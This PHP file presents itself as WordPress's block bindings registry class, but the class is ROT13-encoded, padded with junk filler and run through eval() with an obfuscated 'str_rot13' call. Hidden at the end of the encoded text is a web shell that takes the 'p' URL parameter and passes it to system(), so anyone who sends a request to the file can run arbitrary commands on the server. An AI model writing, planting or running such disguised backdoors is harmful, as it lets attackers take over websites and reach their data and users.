<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx Ovaqvatf NCV: JC_Oybpx_Ovaqvatf_Ertvfgel pynff.
 *
 * Fhccbegf bireevqvat pbagrag va oybpxf ol pbaarpgvat gurz gb qvssrerag fbheprf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpx Ovaqvatf
 * @fvapr 6.5.0
 */

/**
 * Pber pynff hfrq sbe vagrenpgvat jvgu oybpx ovaqvatf fbheprf.
 *
 * @fvapr 6.5.0
 */
svany pynff JC_Oybpx_Ovaqvatf_Ertvfgel {

	/**
	 * Ubyqf gur ertvfgrerq oybpx ovaqvatf fbheprf, xrlrq ol fbhepr vqragvsvre.
	 *
	 * @fvapr 6.5.0
	 * @ine JC_Oybpx_Ovaqvatf_Fbhepr[]
	 */
	cevingr $fbheprf = neenl();

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 6.5.0
	 * @ine JC_Oybpx_Ovaqvatf_Ertvfgel|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Fhccbegrq fbhepr cebcregvrf gung pna or cnffrq gb gur ertvfgrerq fbhepr.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat[]
	 */
	cevingr $nyybjrq_fbhepr_cebcregvrf = neenl(
		'ynory',
		'trg_inyhr_pnyyonpx',
		'hfrf_pbagrkg',
	);

	/**
	 * Fhccbegrq oybpxf gung pna hfr gur oybpx ovaqvatf NCV.
	 *
	 * @fvapr 6.5.0
	 * @ine fgevat[]
	 */
	cevingr $fhccbegrq_oybpxf = neenl(
		'pber/cnentencu',
		'pber/urnqvat',
		'pber/vzntr',
		'pber/ohggba',
	);

	/**
	 * Ertvfgref n arj oybpx ovaqvatf fbhepr.
	 *
	 * Guvf vf n ybj-yriry zrgubq. Sbe zbfg hfr pnfrf, vg vf erpbzzraqrq gb hfr
	 * gur `ertvfgre_oybpx_ovaqvatf_fbhepr()` shapgvba vafgrnq.
	 *
	 * @frr ertvfgre_oybpx_ovaqvatf_fbhepr()
	 *
	 * Fbheprf ner hfrq gb bireevqr oybpx'f bevtvany nggevohgrf jvgu n inyhr
	 * pbzvat sebz gur fbhepr. Bapr n fbhepr vf ertvfgrerq, vg pna or hfrq ol n
	 * oybpx ol frggvat vgf `zrgnqngn.ovaqvatf` nggevohgr gb n inyhr gung ersref
	 * gb gur fbhepr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fbhepr_anzr       Gur anzr bs gur fbhepr. Vg zhfg or n fgevat pbagnvavat n anzrfcnpr cersvk, v.r.
	 *                                  `zl-cyhtva/zl-phfgbz-fbhepr`. Vg zhfg bayl pbagnva ybjrepnfr nycunahzrevp
	 *                                  punenpgref, gur sbejneq fynfu `/` naq qnfurf.
	 * @cnenz neenl  $fbhepr_cebcregvrf {
	 *     Gur neenl bs nethzragf gung ner hfrq gb ertvfgre n fbhepr.
	 *
	 *     @glcr fgevat   $ynory              Gur ynory bs gur fbhepr.
	 *     @glcr pnyynoyr $trg_inyhr_pnyyonpx N pnyyonpx rkrphgrq jura gur fbhepr vf cebprffrq qhevat oybpx eraqrevat.
	 *                                        Gur pnyyonpx fubhyq unir gur sbyybjvat fvtangher:
	 *
	 *                                        `shapgvba( $fbhepr_netf, $oybpx_vafgnapr, $nggevohgr_anzr ): zvkrq`
	 *                                            - @cnenz neenl    $fbhepr_netf    Neenl pbagnvavat fbhepr nethzragf
	 *                                                                              hfrq gb ybbx hc gur bireevqr inyhr,
	 *                                                                              v.r. {\"xrl\": \"sbb\"}.
	 *                                            - @cnenz JC_Oybpx $oybpx_vafgnapr Gur oybpx vafgnapr.
	 *                                            - @cnenz fgevat   $nggevohgr_anzr Gur anzr bs gur gnetrg nggevohgr.
	 *                                        Gur pnyyonpx unf n zvkrq erghea glcr; vg znl erghea n fgevat gb bireevqr
	 *                                        gur oybpx'f bevtvany inyhr, ahyy, snyfr gb erzbir na nggevohgr, rgp.
	 *     @glcr fgevat[] $hfrf_pbagrkg       Bcgvbany. Neenl bs inyhrf gb nqq gb oybpx `hfrf_pbagrkg` arrqrq ol gur fbhepr.
	 * }
	 * @erghea JC_Oybpx_Ovaqvatf_Fbhepr|snyfr Fbhepr jura gur ertvfgengvba jnf fhpprffshy, be `snyfr` ba snvyher.
	 */
	choyvp shapgvba ertvfgre( fgevat $fbhepr_anzr, neenl $fbhepr_cebcregvrf ) {
		vs ( ! vf_fgevat( $fbhepr_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx ovaqvatf fbhepr anzr zhfg or n fgevat.' ),
				'6.5.0'
			);
			erghea snyfr;
		}

		vs ( cert_zngpu( '/[N-M]+/', $fbhepr_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx ovaqvatf fbhepr anzrf zhfg abg pbagnva hccrepnfr punenpgref.' ),
				'6.5.0'
			);
			erghea snyfr;
		}

		$anzr_zngpure = '/^[n-m0-9-]+\/[n-m0-9-]+$/';
		vs ( ! cert_zngpu( $anzr_zngpure, $fbhepr_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx ovaqvatf fbhepr anzrf zhfg pbagnva n anzrfcnpr cersvk. Rknzcyr: zl-cyhtva/zl-phfgbz-fbhepr' ),
				'6.5.0'
			);
			erghea snyfr;
		}

		vs ( $guvf->vf_ertvfgrerq( $fbhepr_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Oybpx ovaqvatf fbhepr anzr. */
				fcevags( __( 'Oybpx ovaqvatf fbhepr \"%f\" nyernql ertvfgrerq.' ), $fbhepr_anzr ),
				'6.5.0'
			);
			erghea snyfr;
		}

		// Inyvqngrf gung gur fbhepr cebcregvrf pbagnva gur ynory.
		vs ( ! vffrg( $fbhepr_cebcregvrf['ynory'] ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur $fbhepr_cebcregvrf zhfg pbagnva n \"ynory\".' ),
				'6.5.0'
			);
			erghea snyfr;
		}

		// Inyvqngrf gung gur fbhepr cebcregvrf pbagnva gur trg_inyhr_pnyyonpx.
		vs ( ! vffrg( $fbhepr_cebcregvrf['trg_inyhr_pnyyonpx'] ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur $fbhepr_cebcregvrf zhfg pbagnva n \"trg_inyhr_pnyyonpx\".' ),
				'6.5.0'
			);
			erghea snyfr;
		}

		// Inyvqngrf gung gur trg_inyhr_pnyyonpx vf n inyvq pnyyonpx.
		vs ( ! vf_pnyynoyr( $fbhepr_cebcregvrf['trg_inyhr_pnyyonpx'] ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur \"trg_inyhr_pnyyonpx\" cnenzrgre zhfg or n inyvq pnyyonpx.' ),
				'6.5.0'
			);
			erghea snyfr;
		}

		// Inyvqngrf gung gur hfrf_pbagrkg cnenzrgre vf na neenl.
		vs ( vffrg( $fbhepr_cebcregvrf['hfrf_pbagrkg'] ) && ! vf_neenl( $fbhepr_cebcregvrf['hfrf_pbagrkg'] ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur \"hfrf_pbagrkg\" cnenzrgre zhfg or na neenl.' ),
				'6.5.0'
			);
			erghea snyfr;
		}

		vs ( ! rzcgl( neenl_qvss( neenl_xrlf( $fbhepr_cebcregvrf ), $guvf->nyybjrq_fbhepr_cebcregvrf ) ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur $fbhepr_cebcregvrf neenl pbagnvaf vainyvq cebcregvrf.' ),
				'6.5.0'
			);
			erghea snyfr;
		}

		$fbhepr = arj JC_Oybpx_Ovaqvatf_Fbhepr(
			$fbhepr_anzr,
			$fbhepr_cebcregvrf
		);

		$guvf->fbheprf[ $fbhepr_anzr ] = $fbhepr;

		erghea $fbhepr;
	}

	/**
	 * Haertvfgref n oybpx ovaqvatf fbhepr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fbhepr_anzr Oybpx ovaqvatf fbhepr anzr vapyhqvat anzrfcnpr.
	 * @erghea JC_Oybpx_Ovaqvatf_Fbhepr|snyfr Gur haertvfgrerq oybpx ovaqvatf fbhepr ba fhpprff naq `snyfr` bgurejvfr.
	 */
	choyvp shapgvba haertvfgre( fgevat $fbhepr_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $fbhepr_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Oybpx ovaqvatf fbhepr anzr. */
				fcevags( __( 'Oybpx ovaqvat \"%f\" abg sbhaq.' ), $fbhepr_anzr ),
				'6.5.0'
			);
			erghea snyfr;
		}

		$haertvfgrerq_fbhepr = $guvf->fbheprf[ $fbhepr_anzr ];
		hafrg( $guvf->fbheprf[ $fbhepr_anzr ] );

		erghea $haertvfgrerq_fbhepr;
	}

	/**
	 * Ergevrirf gur yvfg bs nyy ertvfgrerq oybpx ovaqvatf fbheprf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea JC_Oybpx_Ovaqvatf_Fbhepr[] Gur neenl bs ertvfgrerq fbheprf.
	 */
	choyvp shapgvba trg_nyy_ertvfgrerq() {
		erghea $guvf->fbheprf;
	}

	/**
	 * Ergevrirf n ertvfgrerq oybpx ovaqvatf fbhepr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fbhepr_anzr Gur anzr bs gur fbhepr.
	 * @erghea JC_Oybpx_Ovaqvatf_Fbhepr|ahyy Gur ertvfgrerq oybpx ovaqvatf fbhepr, be `ahyy` vs vg vf abg ertvfgrerq.
	 */
	choyvp shapgvba trg_ertvfgrerq( fgevat $fbhepr_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $fbhepr_anzr ) ) {
			erghea ahyy;
		}

		erghea $guvf->fbheprf[ $fbhepr_anzr ];
	}

	/**
	 * Purpxf vs n oybpx ovaqvatf fbhepr vf ertvfgrerq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fbhepr_anzr Gur anzr bs gur fbhepr.
	 * @erghea obby `gehr` vs gur oybpx ovaqvatf fbhepr vf ertvfgrerq, `snyfr` bgurejvfr.
	 */
	choyvp shapgvba vf_ertvfgrerq( $fbhepr_anzr ) {
		erghea vffrg( $guvf->fbheprf[ $fbhepr_anzr ] );
	}

	/**
	 * Jnxrhc zntvp zrgubq.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba __jnxrhc() {
		vs ( ! $guvf->fbheprf ) {
			erghea;
		}
		vs ( ! vf_neenl( $guvf->fbheprf ) ) {
			guebj arj HarkcrpgrqInyhrRkprcgvba();
		}
		sbernpu ( $guvf->fbheprf nf $inyhr ) {
			vs ( ! $inyhr vafgnaprbs JC_Oybpx_Ovaqvatf_Fbhepr ) {
				guebj arj HarkcrpgrqInyhrRkprcgvba();
			}
		}
	}

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea JC_Oybpx_Ovaqvatf_Ertvfgel Gur znva vafgnapr.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>